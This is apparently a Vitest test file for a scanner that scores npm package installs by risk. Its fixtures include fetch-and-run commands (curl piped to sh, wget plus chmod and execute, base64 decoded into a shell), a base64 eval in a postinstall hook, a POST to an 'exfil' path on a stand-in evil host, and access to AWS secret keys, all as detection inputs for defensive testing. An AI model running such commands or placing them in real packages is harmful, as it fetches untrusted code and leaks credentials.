import { describe, it, expect } from 'vitest'
import { evaluate, DEFAULT_RULES } from '../index'
import {
  npmInstallEvents,
  suspiciousInstallEvents,
  maliciousNetworkEvents,
  makeReport,
  cleanReport,
} from '@ojo/monitor'

describe('evaluate', () => {
  it('flags install with only npm registry traffic as SAFE', () => {
    const events = [
      { type: 'process_execution' as const, timestamp: Date.now(), severity: 'info' as const, pid: 1, command: 'node', args: ['npm', 'install', 'is-odd'] },
      { type: 'network_request' as const, timestamp: Date.now(), severity: 'info' as const, protocol: 'https' as const, host: 'registry.npmjs.org', path: '/is-odd', method: 'GET' },
      { type: 'filesystem_mutation' as const, timestamp: Date.now(), severity: 'info' as const, operation: 'write' as const, path: '/app/node_modules/is-odd/index.js' },
    ]
    const report = makeReport('s-clean', 'is-odd', events)
    const result = evaluate(report)
    expect(result.riskLevel).toBe('SAFE')
    expect(result.score).toBe(0)
    expect(result.rules.every((r) => r.passed)).toBe(true)
  })

  it('flags suspicious install as HIGH', () => {
    const report = makeReport('s-1', 'suspicious-pkg', suspiciousInstallEvents)
    const result = evaluate(report)
    expect(result.riskLevel).toBe('HIGH')
    expect(result.score).toBeGreaterThan(50)
  })

  it('flags malicious network events as HIGH', () => {
    const report = makeReport('s-2', 'bad-pkg', maliciousNetworkEvents)
    const result = evaluate(report)
    expect(result.riskLevel).toBe('HIGH')
    expect(result.score).toBeGreaterThan(50)
  })

  it('includes summary in report', () => {
    const report = makeReport('s-3', 'test-pkg', suspiciousInstallEvents)
    const result = evaluate(report)
    expect(result.summary).toBeTruthy()
    expect(typeof result.summary).toBe('string')
  })

  it('respects blockedRules option', () => {
    const report = makeReport('s-4', 'test-pkg', suspiciousInstallEvents)
    const withBlocked = evaluate(report, { blockedRules: ['suspicious_commands', 'curl_wget'] })
    const withoutBlocked = evaluate(report)
    expect(withBlocked.score).toBeLessThan(withoutBlocked.score)
  })
})

describe('DEFAULT_RULES', () => {
  it('has all expected rules', () => {
    const names = DEFAULT_RULES.map((r) => r.name)
    expect(names).toContain('postinstall_scripts')
    expect(names).toContain('suspicious_commands')
    expect(names).toContain('curl_wget')
    expect(names).toContain('outbound_network')
    expect(names).toContain('obfuscated_scripts')
    expect(names).toContain('env_access')
    expect(names).toContain('package_metadata')
  })

  it('all rules have a check function', () => {
    for (const rule of DEFAULT_RULES) {
      expect(typeof rule.check).toBe('function')
    }
  })
})

describe('rule scoring', () => {
  it('postinstall_scripts triggers on lifecycle scripts', () => {
    const events = [
      {
        type: 'lifecycle_script' as const,
        timestamp: Date.now(),
        severity: 'info' as const,
        scriptType: 'postinstall' as const,
        command: 'node build.js',
      },
    ]
    const report = makeReport('s-5', 'test-pkg', events)
    const result = evaluate(report)
    expect(result.score).toBeGreaterThanOrEqual(15)
    const rule = result.rules.find((r) => r.ruleName === 'postinstall_scripts')
    expect(rule?.passed).toBe(false)
  })

  it('suspicious_commands triggers on base64 decode', () => {
    const events = [
      {
        type: 'process_execution' as const,
        timestamp: Date.now(),
        severity: 'info' as const,
        pid: 1,
        command: 'echo',
        args: ['"YWJj"', '|', 'base64', '-d'],
      },
    ]
    const report = makeReport('s-6', 'test-pkg', events)
    const result = evaluate(report)
    expect(result.score).toBeGreaterThanOrEqual(20)
  })

  it('curl_wget triggers on binary download', () => {
    const events = [
      {
        type: 'binary_download' as const,
        timestamp: Date.now(),
        severity: 'warning' as const,
        url: 'https://evil.example.com/payload',
        destinationPath: '/tmp/payload',
      },
    ]
    const report = makeReport('s-7', 'test-pkg', events)
    const result = evaluate(report)
    expect(result.score).toBeGreaterThanOrEqual(25)
  })

  it('outbound_network triggers on non-whitelist host', () => {
    const events = [
      {
        type: 'network_request' as const,
        timestamp: Date.now(),
        severity: 'warning' as const,
        protocol: 'https' as const,
        host: 'evil.example.com',
        path: '/exfil',
        method: 'POST',
      },
    ]
    const report = makeReport('s-8', 'test-pkg', events)
    const result = evaluate(report)
    expect(result.score).toBeGreaterThanOrEqual(10)
  })

  it('outbound_network does NOT trigger for npm registry', () => {
    const events = [
      {
        type: 'network_request' as const,
        timestamp: Date.now(),
        severity: 'info' as const,
        protocol: 'https' as const,
        host: 'registry.npmjs.org',
        path: '/is-odd',
        method: 'GET',
      },
    ]
    const report = makeReport('s-9', 'test-pkg', events)
    const result = evaluate(report)
    const rule = result.rules.find((r) => r.ruleName === 'outbound_network')
    expect(rule?.passed).toBe(true)
  })

  it('env_access triggers on sensitive keys', () => {
    const events = [
      {
        type: 'environment_access' as const,
        timestamp: Date.now(),
        severity: 'warning' as const,
        key: 'AWS_SECRET_ACCESS_KEY',
      },
    ]
    const report = makeReport('s-10', 'test-pkg', events)
    const result = evaluate(report)
    expect(result.score).toBeGreaterThanOrEqual(10)
  })

  it('env_access does NOT trigger for NODE_ENV', () => {
    const events = [
      {
        type: 'environment_access' as const,
        timestamp: Date.now(),
        severity: 'info' as const,
        key: 'NODE_ENV',
      },
    ]
    const report = makeReport('s-11', 'test-pkg', events)
    const result = evaluate(report)
    const rule = result.rules.find((r) => r.ruleName === 'env_access')
    expect(rule?.passed).toBe(true)
  })

  it('obfuscated_scripts triggers on long base64 in lifecycle', () => {
    const events = [
      {
        type: 'lifecycle_script' as const,
        timestamp: Date.now(),
        severity: 'info' as const,
        scriptType: 'postinstall' as const,
        command: `node -e "eval(Buffer.from('${'A'.repeat(200)}', 'base64').toString())"`,
      },
    ]
    const report = makeReport('s-12', 'test-pkg', events)
    const result = evaluate(report)
    const rule = result.rules.find((r) => r.ruleName === 'obfuscated_scripts')
    expect(rule?.passed).toBe(false)
  })

  it('package_metadata is skipped when no metadata available', () => {
    const result = evaluate(cleanReport)
    const rule = result.rules.find((r) => r.ruleName === 'package_metadata')
    expect(rule).toBeDefined()
    expect(rule?.skipped).toBe(true)
    const old = result.rules.find((r) => r.ruleName === 'newly_published')
    expect(old).toBeUndefined()
  })
})

describe('suspicious_commands false positive prevention', () => {
  it('sh -c alone does not trigger suspicious_commands', () => {
    const events = [
      {
        type: 'process_execution' as const,
        timestamp: Date.now(),
        severity: 'info' as const,
        pid: 1,
        command: 'sh',
        args: ['-c', 'npm install is-odd'],
      },
    ]
    const report = makeReport('fp-1', 'test-pkg', events)
    const result = evaluate(report)
    const rule = result.rules.find((r) => r.ruleName === 'suspicious_commands')
    expect(rule?.passed).toBe(true)
    expect(rule?.score).toBe(0)
  })

  it('bash -c alone does not trigger suspicious_commands', () => {
    const events = [
      {
        type: 'process_execution' as const,
        timestamp: Date.now(),
        severity: 'info' as const,
        pid: 1,
        command: 'bash',
        args: ['-c', 'npm install react'],
      },
    ]
    const report = makeReport('fp-2', 'test-pkg', events)
    const result = evaluate(report)
    const rule = result.rules.find((r) => r.ruleName === 'suspicious_commands')
    expect(rule?.passed).toBe(true)
  })

  it('sh -c with node postinstall does not trigger', () => {
    const events = [
      {
        type: 'process_execution' as const,
        timestamp: Date.now(),
        severity: 'info' as const,
        pid: 1,
        command: 'sh',
        args: ['-c', 'node postinstall.js'],
      },
    ]
    const report = makeReport('fp-3', 'test-pkg', events)
    const result = evaluate(report)
    const rule = result.rules.find((r) => r.ruleName === 'suspicious_commands')
    expect(rule?.passed).toBe(true)
  })

  it('curl piped to shell triggers suspicious_commands', () => {
    const events = [
      {
        type: 'process_execution' as const,
        timestamp: Date.now(),
        severity: 'warning' as const,
        pid: 1,
        command: 'sh',
        args: ['-c', 'curl https://evil.example.com/payload.sh | sh'],
      },
    ]
    const report = makeReport('fp-4', 'test-pkg', events)
    const result = evaluate(report)
    const rule = result.rules.find((r) => r.ruleName === 'suspicious_commands')
    expect(rule?.passed).toBe(false)
    expect(rule?.score).toBeGreaterThanOrEqual(20)
  })

  it('wget && chmod +x triggers suspicious_commands', () => {
    const events = [
      {
        type: 'process_execution' as const,
        timestamp: Date.now(),
        severity: 'warning' as const,
        pid: 1,
        command: 'sh',
        args: ['-c', 'wget http://evil.example.com/binary && chmod +x binary && ./binary'],
      },
    ]
    const report = makeReport('fp-5', 'test-pkg', events)
    const result = evaluate(report)
    const rule = result.rules.find((r) => r.ruleName === 'suspicious_commands')
    expect(rule?.passed).toBe(false)
  })

  it('base64 -d piped to shell triggers suspicious_commands', () => {
    const events = [
      {
        type: 'process_execution' as const,
        timestamp: Date.now(),
        severity: 'warning' as const,
        pid: 1,
        command: 'sh',
        args: ['-c', 'echo YWJj | base64 -d | sh'],
      },
    ]
    const report = makeReport('fp-6', 'test-pkg', events)
    const result = evaluate(report)
    const rule = result.rules.find((r) => r.ruleName === 'suspicious_commands')
    expect(rule?.passed).toBe(false)
  })

  it('normal npm lifecycle output remains low risk', () => {
    const events = [
      {
        type: 'process_execution' as const,
        timestamp: Date.now(),
        severity: 'info' as const,
        pid: 1,
        command: 'npm',
        args: ['install', 'is-odd'],
      },
    ]
    const report = makeReport('fp-7', 'test-pkg', events)
    const result = evaluate(report)
    expect(result.riskLevel).toBe('SAFE')
    const rule = result.rules.find((r) => r.ruleName === 'suspicious_commands')
    expect(rule?.passed).toBe(true)
  })
})

describe('edge cases', () => {
  it('handles empty events', () => {
    const report = makeReport('s-13', 'empty-pkg', [], 100)
    const result = evaluate(report)
    expect(result.riskLevel).toBe('SAFE')
  })

  it('skips outbound_network rule when network signal is unavailable', () => {
    const report = makeReport('s-skip', 'test-pkg', [])
    report.availableSignals.network_request = 'unavailable'
    const result = evaluate(report)
    const rule = result.rules.find((r) => r.ruleName === 'outbound_network')
    expect(rule?.skipped).toBe(true)
    expect(rule?.score).toBe(0)
    expect(rule?.detail).toContain('unavailable')
  })

  it('does not skip outbound_network when signal is inferred', () => {
    const report = makeReport('s-noskip', 'test-pkg', [])
    report.availableSignals.network_request = 'inferred'
    const result = evaluate(report)
    const rule = result.rules.find((r) => r.ruleName === 'outbound_network')
    expect(rule?.skipped).toBeFalsy()
  })

  it('skipped rules do not contribute to score', () => {
    const report = makeReport('s-score', 'test-pkg', [])
    report.availableSignals.network_request = 'unavailable'
    const resultWithSkip = evaluate(report)
    const scoreWithSkip = resultWithSkip.score

    report.availableSignals.network_request = 'inferred'
    const resultWithoutSkip = evaluate(report)
    expect(scoreWithSkip).toBe(resultWithoutSkip.score)
  })
})
